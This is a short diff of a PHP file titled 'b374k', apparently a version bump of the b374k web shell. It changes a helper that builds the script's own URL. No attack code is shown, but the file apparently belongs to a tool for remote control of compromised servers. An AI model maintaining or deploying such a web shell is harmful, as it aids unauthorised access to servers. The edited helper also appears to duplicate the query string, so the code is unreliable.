@@ -1,5 +1,5 @@
 <?php
-$GLOBALS['ver'] = "3.0";
+$GLOBALS['ver'] = "3.1";
 $GLOBALS['title'] = "b374k";
 
 @ob_start();
@@ -60,7 +60,8 @@ if(!function_exists('get_server_info')){
 
 if(!function_exists('get_self')){
 	function get_self(){
-		return $_SERVER["REQUEST_URI"];
+		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
+		return $_SERVER["REQUEST_URI"].$query;
 	}
 }
 
